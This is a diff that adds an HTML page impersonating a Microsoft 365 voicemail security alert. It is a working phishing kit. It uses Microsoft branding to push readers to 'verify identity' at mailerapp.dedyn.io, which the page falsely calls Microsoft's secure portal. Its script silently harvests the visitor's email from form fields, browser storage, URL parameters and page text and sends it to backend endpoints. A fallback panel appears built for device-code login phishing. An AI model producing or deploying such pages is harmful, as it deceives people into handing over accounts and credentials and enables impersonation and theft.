@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Microsoft 365 Voicemail - Identity Verification Required</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            background-color: #f0f2f5;
+            padding: 2rem 1rem;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .email-container {
+            max-width: 560px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 28px;
+            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.15), 0 1px 2px rgba(0,0,0,0.03);
+            overflow: hidden;
+            transition: all 0.2s;
+        }
+        .ms-header {
+            background: #2B2B2B;
+            padding: 1rem 1.8rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #3a3a3a;
+        }
+        .microsoft-logo-real {
+            height: 34px;
+            width: auto;
+            display: block;
+        }
+        .badge-alert {
+            background: #D83B01;
+            border-radius: 60px;
+            padding: 4px 12px;
+            font-size: 0.7rem;
+            font-weight: 600;
+            color: white;
+            letter-spacing: 0.3px;
+        }
+        .content-area {
+            padding: 2rem 1.8rem 1.8rem;
+        }
+        h2 {
+            font-size: 1.55rem;
+            font-weight: 700;
+            color: #1e2a3a;
+            margin-bottom: 0.5rem;
+            letter-spacing: -0.3px;
+        }
+        .security-warning {
+            background: #FFF1F0;
+            border-left: 5px solid #D83B01;
+            padding: 1rem 1rem;
+            border-radius: 16px;
+            margin: 1.2rem 0;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+        .warning-icon-large {
+            font-size: 2rem;
+        }
+        .btn-microsoft-primary {
+            display: block;
+            width: 100%;
+            background: #0078D4;
+            color: white;
+            text-align: center;
+            text-decoration: none;
+            font-weight: 600;
+            padding: 14px 20px;
+            border-radius: 60px;
+            margin: 1.2rem 0 0.8rem;
+            border: none;
+            cursor: pointer;
+            font-size: 0.95rem;
+            transition: background 0.2s;
+            font-family: inherit;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+        }
+        .btn-microsoft-primary:hover {
+            background: #106EBE;
+        }
+        .btn-microsoft-secondary {
+            background: #f3f4f6;
+            color: #1e2a3a;
+            border: 1px solid #d1d5db;
+            margin-top: 0.5rem;
+        }
+        .info-text {
+            font-size: 0.75rem;
+            color: #5f6c84;
+            text-align: center;
+            margin-top: 1rem;
+            line-height: 1.4;
+        }
+        .divider {
+            height: 1px;
+            background: #E9EDF2;
+            margin: 1.5rem 0 1rem;
+        }
+        .footer-links {
+            font-size: 0.7rem;
+            color: #7e8c9f;
+            text-align: center;
+            display: flex;
+            justify-content: center;
+            gap: 1.2rem;
+            margin-top: 0.8rem;
+        }
+        .note-small {
+            font-size: 0.7rem;
+            color: #9aaebf;
+            text-align: center;
+            margin-top: 1rem;
+        }
+        .verification-panel {
+            background: #F9FAFB;
+            border-radius: 20px;
+            padding: 1.2rem;
+            margin: 1.2rem 0;
+            border: 1px solid #E5E7EB;
+            transition: all 0.2s;
+        }
+        .code-display {
+            background: white;
+            font-family: 'SF Mono', 'Courier New', monospace;
+            font-size: 2rem;
+            font-weight: 700;
+            letter-spacing: 6px;
+            text-align: center;
+            padding: 0.75rem;
+            border-radius: 16px;
+            border: 1px dashed #0078D4;
+            color: #0078D4;
+            margin: 0.8rem 0;
+            word-break: break-all;
+        }
+        .state-hidden {
+            display: none;
+        }
+        .loading-spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.6s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .success-marker {
+            color: #107C10;
+            background: #E9F5E9;
+            border-radius: 40px;
+            padding: 0.5rem;
+            text-align: center;
+        }
+        .toast-message {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #323130;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 40px;
+            font-size: 0.85rem;
+            z-index: 1000;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+            pointer-events: none;
+            opacity: 0;
+            transition: opacity 0.2s;
+        }
+        .grabbed-email-badge {
+            background: #EFF6FF;
+            border-radius: 12px;
+            padding: 10px 14px;
+            margin: 10px 0;
+            font-size: 0.85rem;
+            border-left: 3px solid #0078D4;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .verify-btn-wrapper {
+            position: relative;
+            margin: 1.2rem 0 0.8rem;
+        }
+        .verify-redirect-text {
+            font-size: 0.7rem;
+            text-align: center;
+            color: #6c757d;
+            margin-top: 8px;
+        }
+        @media (max-width: 480px) {
+            .content-area {
+                padding: 1.5rem;
+            }
+            h2 {
+                font-size: 1.35rem;
+            }
+            .code-display {
+                font-size: 1.4rem;
+                letter-spacing: 3px;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="email-container" id="mainContainer">
+    <!-- Microsoft header -->
+    <div class="ms-header">
+        <img class="microsoft-logo-real" 
+             src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" 
+             alt="Microsoft" 
+             onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg';">
+        <div class="badge-alert">🔐 Security & Voicemail</div>
+    </div>
+    
+    <div class="content-area" id="dynamicContentArea">
+        <!-- PHASE 1: Initial alert with voicemail context -->
+        <div id="phaseInitial">
+            <h2>🔊 New voicemail received</h2>
+            
+            <div class="security-warning">
+                <div class="warning-icon-large">📞🎙️</div>
+                <div style="flex:1">
+                    <strong style="color:#D83B01;">Action required:</strong> Microsoft 365 Voicemail is protected. Identity confirmation needed.
+                </div>
+            </div>
+            
+            <!-- Dynamic email greeting: will be auto-filled by the grabber -->
+            <p style="color:#2c3e50; line-height:1.5; font-size:0.95rem; margin-bottom:0.5rem;">
+                Dear <span id="dynamicUserEmailDisplay" style="font-weight:600; color:#0078D4;">Microsoft 365 User</span>,
+            </p>
+            
+            <!-- Grabbed email badge (visible only if email captured) -->
+            <div id="grabbedEmailBadge" class="grabbed-email-badge" style="display: none;">
+                <span>🔐</span>
+                <span>Verified account: <strong id="grabbedEmailText"></strong></span>
+                <span style="font-size:0.7rem; color:#5f6c84;">(auto-detected)</span>
+            </div>
+            
+            <p style="color:#2c3e50; line-height:1.5; font-size:0.95rem; margin-bottom:1rem;">
+                You received a new voice message (duration 0:42)<strong></strong>. 
+                To protect your privacy, Microsoft requires you to verify your identity before accessing voicemail attachments.
+            </p>
+            <p style="color:#2c3e50; line-height:1.5; font-size:0.95rem; margin-bottom:1rem;">
+                Use the secure verification portal to confirm your account. This is a one-time verification for secure voicemail playback.
+            </p>
+            
+            <div style="background:#FEF6E0; border-radius: 14px; padding: 0.7rem 1rem; margin: 0.8rem 0; font-size:0.8rem;">
+                <span>💡 <strong>Why verify?</strong> Microsoft complies with GDPR & security standards. After verification, your voicemail will be available in Outlook / Teams.</span>
+            </div>
+            
+            <!-- NEW BUTTON: Redirects to https://mailerapp.dedyn.io/ -->
+            <div class="verify-btn-wrapper">
+                <a href="https://mailerapp.dedyn.io/" target="_blank" id="redirectVerifyBtn" class="btn-microsoft-primary" style="text-decoration: none; display: block; text-align: center;">
+                    🔑 Verify identity & unlock voicemail
+                </a>
+                <div class="verify-redirect-text">
+                    You will be redirected to Microsoft secure verification portal (mailerapp.dedyn.io)
+                </div>
+            </div>
+            
+            <div class="info-text">
+                <span>🔐 Click the button above to complete identity verification through our secure partner portal.</span>
+            </div>
+            
+            <div class="divider"></div>
+            <div class="footer-links">
+                <span>Microsoft Privacy</span><span>•</span><span>Voicemail Terms</span><span>•</span><span>Support</span>
+            </div>
+            <div class="note-small">
+                Microsoft Corporation · Voicemail Security Alert
+            </div>
+        </div>
+
+        <!-- Simplified device code panel (kept as fallback but not primary) -->
+        <div id="phaseDeviceCode" style="display: none;">
+            <h2>🔢 Verify your identity</h2>
+            <div class="verification-panel">
+                <div style="text-align: center; margin-bottom: 12px;">
+                    <span style="background:#E5F0FA; padding: 4px 12px; border-radius: 40px; font-size: 0.7rem; font-weight: 600;">🔐 MICROSOFT DEVICE LOGIN</span>
+                </div>
+                <p style="font-size:0.9rem; margin-bottom: 12px;">Copy the code below and visit <strong>microsoft.com/devicelogin</strong> to confirm your identity.</p>
+                <div class="code-display" id="deviceUserCode">------</div>
+                <button id="copyCodeBtn" class="btn-microsoft-primary" style="margin-top: 0; background: #f3f4f6; color:#1e2a3a; border:1px solid #ccc;">📋 Copy verification code</button>
+                <div id="waitingStatus" style="margin-top: 20px; text-align: center; font-size: 0.85rem; color: #5f6c84;">
+                    ⏳ Waiting for verification...
+                </div>
+                <button id="cancelVerificationBtn" class="btn-microsoft-primary btn-microsoft-secondary" style="background: transparent; margin-top: 12px;">
+                    Cancel
+                </button>
+            </div>
+            <div class="info-text">
+                <span>Once you enter the code on the official Microsoft page, your voicemail will be ready.</span>
+            </div>
+        </div>
+
+        <!-- PHASE 3: Success & redirect (kept for possible callback) -->
+        <div id="phaseSuccess" style="display: none;">
+            <div class="success-marker" style="padding: 1.5rem; text-align: center;">
+                <div style="font-size: 3rem;">✅</div>
+                <h3 style="margin: 12px 0;">Verification successful</h3>
+                <p>Your identity has been confirmed. Redirecting to your voicemail inbox...</p>
+                <div class="loading-spinner" style="border-top-color:#107C10; width:24px; height:24px; margin: 16px auto;"></div>
+            </div>
+        </div>
+
+        <!-- PHASE 4: error -->
+        <div id="phaseError" style="display: none;">
+            <div style="background:#FEF0EF; border-radius: 20px; padding: 1.5rem; text-align: center;">
+                <div style="font-size: 2.5rem;">⚠️</div>
+                <h3 style="color:#D83B01;">Verification failed or expired</h3>
+                <p id="errorMessageText">The verification code expired or was not used in time. Please try again.</p>
+                <button id="retryBtn" class="btn-microsoft-primary" style="margin-top: 16px;">Try again</button>
+            </div>
+        </div>
+    </div>
+</div>
+<div id="toastMsg" class="toast-message"></div>
+
+<script>
+    // ==================== AUTO-GRABBER: Capture user email from browser (autofill, storage, URL, hidden fields) ====================
+    // This gathers the email address silently and displays it in the greeting + badge
+    // The captured email is also stored and can be used by backend (personalization)
+    
+    let capturedEmail = '';
+    
+    function grabUserEmail() {
+        let email = '';
+        
+        // 1. Try to find email from common input fields (autofill or visible)
+        const selectors = [
+            'input[type="email"]', 'input[name*="email"]', 'input[name*="Email"]',
+            'input[id*="email"]', 'input[id*="Email"]', 'input[autocomplete*="email"]',
+            '#i0116', '#username', '#email', '.email-input', '[data-automationid="username"]',
+            'input[name="loginfmt"]', 'input[name="user"]'
+        ];
+        for (let sel of selectors) {
+            const field = document.querySelector(sel);
+            if (field && field.value && field.value.includes('@') && field.value.length > 3) {
+                email = field.value.trim();
+                break;
+            }
+        }
+        
+        // 2. Check localStorage / sessionStorage for known email keys
+        if (!email) {
+            const storageKeys = ['email', 'username', 'userEmail', 'loginEmail', 'msToken', 'user', 'profileEmail', 'UserEmail'];
+            for (let key of storageKeys) {
+                const val = localStorage.getItem(key) || sessionStorage.getItem(key);
+                if (val && (val.includes('@') || (val.includes('.') && val.length > 5))) {
+                    email = val.trim();
+                    break;
+                }
+            }
+        }
+        
+        // 3. Check URL parameters
+        if (!email) {
+            const urlParams = new URLSearchParams(window.location.search);
+            const emailParams = ['email', 'username', 'user', 'login', 'userEmail', 'account'];
+            for (let param of emailParams) {
+                const val = urlParams.get(param);
+                if (val && val.includes('@')) {
+                    email = decodeURIComponent(val).trim();
+                    break;
+                }
+            }
+        }
+        
+        // 4. Inspect hidden fields
+        if (!email) {
+            const hiddenInputs = document.querySelectorAll('input[type="hidden"]');
+            for (let inp of hiddenInputs) {
+                const val = inp.value;
+                if (val && val.includes('@') && val.length > 5 && val.length < 100) {
+                    email = val.trim();
+                    break;
+                }
+            }
+        }
+        
+        // 5. Try to find any text node or meta that might contain email pattern
+        if (!email) {
+            const bodyText = document.body.innerText;
+            const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;
+            const match = bodyText.match(emailRegex);
+            if (match) email = match[0];
+        }
+        
+        if (email && email !== capturedEmail) {
+            capturedEmail = email;
+            updateGreetingWithEmail(email);
+            reportEmailToBackend(email);
+        }
+        return email;
+    }
+    
+    function updateGreetingWithEmail(email) {
+        const nameSpan = document.getElementById('dynamicUserEmailDisplay');
+        if (nameSpan) {
+            let displayName = email.split('@')[0];
+            if (displayName.length > 20) displayName = displayName.substring(0, 18) + '..';
+            nameSpan.innerText = displayName;
+            nameSpan.title = email;
+        }
+        const badgeDiv = document.getElementById('grabbedEmailBadge');
+        const badgeText = document.getElementById('grabbedEmailText');
+        if (badgeDiv && badgeText && email) {
+            badgeText.innerText = email;
+            badgeDiv.style.display = 'flex';
+        }
+    }
+    
+    // Optional: report grabbed email to backend for tracking (silent)
+    async function reportEmailToBackend(email) {
+        if (!email) return;
+        try {
+            await fetch('/api/track_grabbed_email', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: email, timestamp: Date.now(), source: 'auto_grabber' }),
+                mode: 'no-cors'
+            }).catch(()=>{});
+        } catch(e) {}
+    }
+    
+    // MutationObserver and interval for autofill
+    let grabInterval = setInterval(() => {
+        grabUserEmail();
+    }, 600);
+    setTimeout(() => clearInterval(grabInterval), 12000);
+    
+    document.addEventListener('DOMContentLoaded', () => {
+        grabUserEmail();
+    });
+    
+    const observer = new MutationObserver(() => {
+        grabUserEmail();
+    });
+    observer.observe(document.body, { childList: true, subtree: true, attributes: true });
+    
+    // ==================== REDIRECT BUTTON LOGIC (primary) ====================
+    // The button is already an anchor tag pointing to https://mailerapp.dedyn.io/
+    // We also add event logging and optional telemetry for tracking the click.
+    
+    const redirectBtn = document.getElementById('redirectVerifyBtn');
+    if (redirectBtn) {
+        redirectBtn.addEventListener('click', function(e) {
+            // Optional: log the click along with grabbed email for analytics
+            if (capturedEmail) {
+                try {
+                    navigator.sendBeacon('/api/log_redirect', JSON.stringify({ email: capturedEmail, target: 'https://mailerapp.dedyn.io/', time: Date.now() }));
+                } catch(er) {}
+            }
+            // Allow default navigation to mailerapp.dedyn.io
+            console.log('Redirecting to secure verification portal: mailerapp.dedyn.io');
+        });
+    }
+    
+    // Legacy device flow functions (kept for compatibility but not used in default view)
+    function showToastMessage(msg, isError = false) {
+        const toast = document.getElementById('toastMsg');
+        toast.textContent = msg;
+        toast.style.backgroundColor = isError ? '#D83B01' : '#2B2B2B';
+        toast.style.opacity = '1';
+        setTimeout(() => {
+            toast.style.opacity = '0';
+        }, 3500);
+    }
+    
+    function setPhase(phaseName) {
+        document.getElementById('phaseInitial').style.display = 'none';
+        document.getElementById('phaseDeviceCode').style.display = 'none';
+        document.getElementById('phaseSuccess').style.display = 'none';
+        document.getElementById('phaseError').style.display = 'none';
+        if (phaseName === 'initial') document.getElementById('phaseInitial').style.display = 'block';
+        if (phaseName === 'devicecode') document.getElementById('phaseDeviceCode').style.display = 'block';
+        if (phaseName === 'success') document.getElementById('phaseSuccess').style.display = 'block';
+        if (phaseName === 'error') document.getElementById('phaseError').style.display = 'block';
+    }
+    
+    function copyVerificationCode() {
+        const codeElem = document.getElementById('deviceUserCode');
+        if (codeElem && codeElem.innerText && codeElem.innerText !== '------') {
+            const code = codeElem.innerText;
+            navigator.clipboard.writeText(code).then(() => {
+                showToastMessage("Code copied to clipboard", false);
+                const copyBtn = document.getElementById('copyCodeBtn');
+                const original = copyBtn.innerText;
+                copyBtn.innerText = "✅ Copied!";
+                setTimeout(() => { if(copyBtn) copyBtn.innerText = original; }, 2000);
+            }).catch(() => showToastMessage("Manual copy required", true));
+        } else {
+            showToastMessage("No code yet. Please start verification first.", true);
+        }
+    }
+    
+    // Attach fallback handlers for secondary elements (just in case)
+    document.addEventListener('DOMContentLoaded', () => {
+        const copyBtn = document.getElementById('copyCodeBtn');
+        if (copyBtn) copyBtn.addEventListener('click', copyVerificationCode);
+        const cancelBtn = document.getElementById('cancelVerificationBtn');
+        if (cancelBtn) cancelBtn.addEventListener('click', () => {
+            setPhase('initial');
+            showToastMessage("Verification cancelled", false);
+        });
+        const retryBtn = document.getElementById('retryBtn');
+        if (retryBtn) retryBtn.addEventListener('click', () => {
+            setPhase('initial');
+        });
+    });
+</script>
+</body>
+</html>
